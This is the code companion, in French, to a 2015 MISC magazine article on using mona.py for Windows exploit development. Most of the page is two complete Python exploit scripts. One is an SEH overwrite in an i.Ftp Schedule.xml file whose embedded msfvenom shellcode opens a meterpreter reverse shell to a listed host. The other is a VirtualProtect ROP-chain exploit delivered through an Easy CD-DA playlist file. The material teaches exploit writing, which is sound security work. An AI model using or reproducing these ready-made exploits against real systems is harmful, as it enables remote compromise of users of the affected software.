MISC numéro 77 - Janvier 2015
=======

### Ramonage de vulns avec mona.py

####Synopsis
Défini par Peter Van Eeckhoutte, son auteur, comme la boite à outils du développement d'exploit en environnement win32, mona.py [1] est un plugin qui fonctionne avec Immunity Debugger et WinDBG. Simple d'utilisation, il a l'énorme avantage de réunir les fonctionnalités de bon nombre d'autres outils tout en s'intégrant dans votre débogueur.
Plutôt que de présenter toutes ses possibilités unes par unes, nous allons à travers des exemples pratiques montrer comment il permet de gagner du temps lors de l'écriture d'exploits en environnement Windows.

#### Remerciements
Merci à Alexandre, André (@andremoulu), Fred (@FredzyPadzy), Inti (@SalasRossenbach) Jérôme (JLeonard), l'équipe MISC (@MISCRedac), Mohamed, Peter (@corelanc0d3r), Saâd (@_saadk) et Thomas pour la relecture et l'inspiration.

#### Les liens
[1] https://github.com/corelan/mona
[2] https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
[3] https://www.corelan.beHYPERLINK "https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/"/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/
[4] https://www.corelan.be/index.HYPERLINK "https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/"php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/
[5] https://www.hackinparis.com/slides/hip2k11/04-ProjectQuebec.pdf
[6] https://www.corelan.be/index.php/2010/01/26/starting-to-write-immunity-debugger-pycommands-my-cheatsheet/
[7] http://www.vmware.com/fr/products/player
[8] https://github.com/corelan/windbglib
[9] http://www.exploit-db.com/exploits/35177
[10] http://www.exploit-db.com/exploits/31643
[11] https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode
[12] https://github.com/MISCMag/MISC-79
[13] https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/

#### L'exploit iftp.py (chapitre 4.3)
```
import os,struct,sys
   
outputfile = 'C:\Program Files\Memecode\i.Ftp\Schedule.xml'
size = 20000
offset_to_nseh = 592

junk1 = "A" * offset_to_nseh
nseh = "\xeb\x06\xCC\xCC" # "\xeb\x06" = jmp $+8 = jump to stackadjust
seh = struct.pack('<L',0x10011887) #0x10011887 : pop ecx # pop ecx # ret 0x08 |  {PAGE_EXECUTE_READ} [Lgi.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Memecode\i.Ftp\Lgi.dll)
stackadjust= "\x81\xc4\x24\xfa\xff\xff"	# add esp,-1500
# ./msfvenom -p windows/meterpreter/reverse_tcp exitfunc=thread lhost=1.1.1.5 R -a x86 --platform windows -b '\x00\x0a\x0d\x20\x22\x3c\x3e' -f python
# Found 22 compatible encoders
# Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
# x86/shikata_ga_nai succeeded with size 308 (iteration=0)
buf =  ""
buf += "\xb8\xca\xa4\x97\xb2\xda\xd7\xd9\x74\x24\xf4\x5a\x2b"
buf += "\xc9\xb1\x47\x83\xc2\x04\x31\x42\x0f\x03\x42\xc5\x46"
buf += "\x62\x4e\x31\x04\x8d\xaf\xc1\x69\x07\x4a\xf0\xa9\x73"
buf += "\x1e\xa2\x19\xf7\x72\x4e\xd1\x55\x67\xc5\x97\x71\x88"
buf += "\x6e\x1d\xa4\xa7\x6f\x0e\x94\xa6\xf3\x4d\xc9\x08\xca"
buf += "\x9d\x1c\x48\x0b\xc3\xed\x18\xc4\x8f\x40\x8d\x61\xc5"
buf += "\x58\x26\x39\xcb\xd8\xdb\x89\xea\xc9\x4d\x82\xb4\xc9"
buf += "\x6c\x47\xcd\x43\x77\x84\xe8\x1a\x0c\x7e\x86\x9c\xc4"
buf += "\x4f\x67\x32\x29\x60\x9a\x4a\x6d\x46\x45\x39\x87\xb5"
buf += "\xf8\x3a\x5c\xc4\x26\xce\x47\x6e\xac\x68\xac\x8f\x61"
buf += "\xee\x27\x83\xce\x64\x6f\x87\xd1\xa9\x1b\xb3\x5a\x4c"
buf += "\xcc\x32\x18\x6b\xc8\x1f\xfa\x12\x49\xc5\xad\x2b\x89"
buf += "\xa6\x12\x8e\xc1\x4a\x46\xa3\x8b\x02\xab\x8e\x33\xd2"
buf += "\xa3\x99\x40\xe0\x6c\x32\xcf\x48\xe4\x9c\x08\xaf\xdf"
buf += "\x59\x86\x4e\xe0\x99\x8e\x94\xb4\xc9\xb8\x3d\xb5\x81"
buf += "\x38\xc2\x60\x05\x69\x6c\xdb\xe6\xd9\xcc\x8b\x8e\x33"
buf += "\xc3\xf4\xaf\x3b\x0e\x9d\x5a\xc1\xd8\xa3\x9b\xc8\x1d"
buf += "\xcc\x99\xca\x0c\x50\x17\x2c\x44\x78\x71\xe6\xf0\xe1"
buf += "\xd8\x7c\x61\xed\xf6\xf8\xa1\x65\xf5\xfd\x6f\x8e\x70"
buf += "\xee\x07\x7e\xcf\x4c\x81\x81\xe5\xfb\x2d\x14\x02\xaa"
buf += "\x7a\x80\x08\x8b\x4c\x0f\xf2\xfe\xc7\x86\x66\x41\xbf"
buf += "\xe6\x66\x41\x3f\xb1\xec\x41\x57\x65\x55\x12\x42\x6a"
buf += "\x40\x06\xdf\xff\x6b\x7f\x8c\xa8\x03\x7d\xeb\x9f\x8b"
buf += "\x7e\xde\x21\xf7\xa8\x26\x54\x19\x69"
junk2 = "C" * (size-len(junk1+nseh+seh+stackadjust+buf))
poc = junk1 + nseh + seh + stackadjust + buf + junk2
header = "\x3c\x3f\x78\x6d\x6c\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x20\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22"
header += "\x55\x54\x46\x2d\x38\x22\x20\x3f\x3e\x0a\x3c\x53\x63\x68\x65\x64\x75\x6c\x65\x3e\x0a\x09\x3c\x45\x76\x65\x6e\x74\x20\x55"
header += "\x72\x6c\x3d\x22\x22\x20\x54\x69\x6d\x65\x3d\x22\x68\x74\x74\x70\x3a\x2f\x2f\x0a"
footer = "\x22\x20\x46\x6f\x6c\x64\x65\x72\x3d\x22\x22\x20\x2f\x3e\x0a\x3c\x2f\x53\x63\x68\x65\x64\x75\x6c\x65\x3e\x0a"
buffer =  header + poc + footer
print "[+] Creating %s" % outputfile
f = open(outputfile,'wb')
print "[+] Writing %d bytes to file" % len(buffer)
f.write(buffer)
print "[+] Done"
f.close()
```

#### L'exploit easy.py (chapitre 4.4)
```
import os,struct

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x10087fe1,  # POP ECX # RETN [audconv.dll]
      0x0042a0e0,  # ptr to &VirtualProtect() [IAT easycdda.exe]
      0x10041e69,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [audconv.dll]
      0x10035802,  # XCHG EAX,ESI # RETN [audconv.dll]
      0x1000327e,  # POP EBP # RETN [audconv.dll]
      0x00403054,  # & push esp # ret 0x08 [easycdda.exe]
      0x0041c160,  # POP EBX # RETN [easycdda.exe]
      0x00000201,  # 0x00000201-> ebx
      0x1007f883,  # POP EDX # RETN [audconv.dll]
      0x00000040,  # 0x00000040-> edx
      0x10090089,  # POP ECX # RETN [audconv.dll]
      0x00434ce9,  # &Writable location [easycdda.exe]
      0x1005d353,  # POP EDI # RETN [audconv.dll]
      0x100378e6,  # RETN (ROP NOP) [audconv.dll]
      0x1007f18a,  # POP EAX # RETN [audconv.dll]
      0x90909090,  # nop
      0x00429692,  # PUSHAD # INC EBX # ADD CL,CH # RETN [easycdda.exe]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

offset_nseh = 1108	#SEH record (nseh field) at 0x0012f4f4 overwritten with normal pattern : 0x6c42396b (offset 1108)
junk1 = "A" * offset_nseh
nseh = "\x90" * 4
seh = struct.pack('L',0x1001b19b)  		# ADD ESP,0C10 # RETN 0x04 [audconv.dll]
ropnops = struct.pack('L',0x100013ac)  	# RET [audconv.dll]
buf =  ""
buf += "\x81\xc4\x24\xfa\xff\xff"	# add esp,-1500
buf += "\xdb\xc8\xd9\x74\x24\xf4\xb8\x20\xa5\xd2\xfe\x5e\x33"
buf += "\xc9\xb1\x47\x83\xee\xfc\x31\x46\x14\x03\x46\x34\x47"
buf += "\x27\x02\xdc\x05\xc8\xfb\x1c\x6a\x40\x1e\x2d\xaa\x36"
buf += "\x6a\x1d\x1a\x3c\x3e\x91\xd1\x10\xab\x22\x97\xbc\xdc"
buf += "\x83\x12\x9b\xd3\x14\x0e\xdf\x72\x96\x4d\x0c\x55\xa7"
buf += "\x9d\x41\x94\xe0\xc0\xa8\xc4\xb9\x8f\x1f\xf9\xce\xda"
buf += "\xa3\x72\x9c\xcb\xa3\x67\x54\xed\x82\x39\xef\xb4\x04"
buf += "\xbb\x3c\xcd\x0c\xa3\x21\xe8\xc7\x58\x91\x86\xd9\x88"
buf += "\xe8\x67\x75\xf5\xc5\x95\x87\x31\xe1\x45\xf2\x4b\x12"
buf += "\xfb\x05\x88\x69\x27\x83\x0b\xc9\xac\x33\xf0\xe8\x61"
buf += "\xa5\x73\xe6\xce\xa1\xdc\xea\xd1\x66\x57\x16\x59\x89"
buf += "\xb8\x9f\x19\xae\x1c\xc4\xfa\xcf\x05\xa0\xad\xf0\x56"
buf += "\x0b\x11\x55\x1c\xa1\x46\xe4\x7f\xad\xab\xc5\x7f\x2d"
buf += "\xa4\x5e\xf3\x1f\x6b\xf5\x9b\x13\xe4\xd3\x5c\x54\xdf"
buf += "\xa4\xf3\xab\xe0\xd4\xda\x6f\xb4\x84\x74\x46\xb5\x4e"
buf += "\x85\x67\x60\xc0\xd5\xc7\xdb\xa1\x85\xa7\x8b\x49\xcc"
buf += "\x28\xf3\x6a\xef\xe3\x9c\x01\x15\x63\xa2\xd4\x14\x76"
buf += "\xcc\xd4\x16\x69\x50\x50\xf0\xe3\x78\x34\xaa\x9b\xe1"
buf += "\x1d\x20\x3a\xed\x8b\x4c\x7c\x65\x38\xb0\x32\x8e\x35"
buf += "\xa2\xa2\x7e\x00\x98\x64\x80\xbe\xb7\x88\x14\x45\x1e"
buf += "\xdf\x80\x47\x47\x17\x0f\xb7\xa2\x2c\x86\x2d\x0d\x5a"
buf += "\xe7\xa1\x8d\x9a\xb1\xab\x8d\xf2\x65\x88\xdd\xe7\x69"
buf += "\x05\x72\xb4\xff\xa6\x23\x69\x57\xcf\xc9\x54\x9f\x50"
buf += "\x31\xb3\x21\xac\xe4\xfd\x57\xdc\x34"
junk2 = "B" * 10000

buffer = junk1 + nseh + seh + ropnops * 23 + rop_chain + buf + junk2

print "[+] Length of total buffer: %s" % len(buffer)
print "[+] Writing sploit in c:\\temp\\ecr.pls"
file = open('c:\\temp\\ecr.pls','wb')
file.write(buffer)
file.close()
```
